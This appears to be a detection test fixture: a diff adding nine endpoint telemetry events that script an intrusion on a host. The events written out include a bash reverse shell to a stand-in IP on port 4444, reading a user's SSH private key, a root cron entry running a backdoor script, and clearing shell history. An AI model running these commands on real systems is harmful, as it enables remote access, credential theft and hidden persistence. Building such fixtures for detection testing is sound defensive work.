@@ -1,0 +1,11 @@
+[
+  {"id":"m1","schema":"sentinelx.agent.v1","host_id":"srv-03","boot_id":"b","ts_unix_ns":1700000000000000000,"kind":"exec","pid":500,"start_ticks":500,"ppid":50,"parent_start_ticks":50,"exe":"/usr/sbin/sshd"},
+  {"id":"m2","schema":"sentinelx.agent.v1","host_id":"srv-03","boot_id":"b","ts_unix_ns":1700000001000000000,"kind":"exec","pid":501,"start_ticks":501,"ppid":500,"parent_start_ticks":500,"exe":"/bin/bash","args":"-i"},
+  {"id":"m3","schema":"sentinelx.agent.v1","host_id":"srv-03","boot_id":"b","ts_unix_ns":1700000002000000000,"kind":"exec","pid":502,"start_ticks":502,"ppid":501,"parent_start_ticks":501,"exe":"/bin/bash","args":"-i >& /dev/tcp/198.51.100.20/4444 0>&1"},
+  {"id":"m4","schema":"sentinelx.agent.v1","host_id":"srv-03","boot_id":"b","ts_unix_ns":1700000003000000000,"kind":"net.connect","pid":502,"start_ticks":502,"exe":"/bin/bash","raddr":"198.51.100.20","rport":4444},
+  {"id":"m5","schema":"sentinelx.agent.v1","host_id":"srv-03","boot_id":"b","ts_unix_ns":1700000004000000000,"kind":"exec","pid":503,"start_ticks":503,"ppid":502,"parent_start_ticks":502,"exe":"/bin/cat","args":"/home/deploy/.ssh/id_rsa"},
+  {"id":"m6","schema":"sentinelx.agent.v1","host_id":"srv-03","boot_id":"b","ts_unix_ns":1700000005000000000,"kind":"file.read","pid":503,"start_ticks":503,"exe":"/bin/cat","path":"/home/deploy/.ssh/id_rsa"},
+  {"id":"m7","schema":"sentinelx.agent.v1","host_id":"srv-03","boot_id":"b","ts_unix_ns":1700000006000000000,"kind":"exec","pid":504,"start_ticks":504,"ppid":502,"parent_start_ticks":502,"exe":"/bin/bash","args":"-c \"echo '* * * * * root /tmp/backdoor.sh' > /etc/cron.d/sysupdate\""},
+  {"id":"m8","schema":"sentinelx.agent.v1","host_id":"srv-03","boot_id":"b","ts_unix_ns":1700000007000000000,"kind":"file.write","pid":504,"start_ticks":504,"exe":"/bin/bash","path":"/etc/cron.d/sysupdate"},
+  {"id":"m9","schema":"sentinelx.agent.v1","host_id":"srv-03","boot_id":"b","ts_unix_ns":1700000008000000000,"kind":"exec","pid":505,"start_ticks":505,"ppid":502,"parent_start_ticks":502,"exe":"/bin/bash","args":"-c \"history -c && unset HISTFILE\""}
+]
